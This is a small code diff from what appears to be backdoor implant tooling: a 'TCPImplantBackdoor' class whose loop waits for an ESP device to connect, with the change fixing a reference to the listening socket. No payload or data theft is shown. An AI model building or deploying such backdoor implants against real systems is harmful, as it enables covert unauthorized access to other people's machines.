@@ -138,7 +138,7 @@ class TCPImplantBackdoor(TCImplantESPInterface):
 		while True:
 			
 			# Wait for esp to connect
-			espConn, espAddr = espServ.accept()
+			espConn, espAddr = self.espServ.accept()
 			espConn.setblocking(0)
 			print("ESP connected:", espAddr)
 
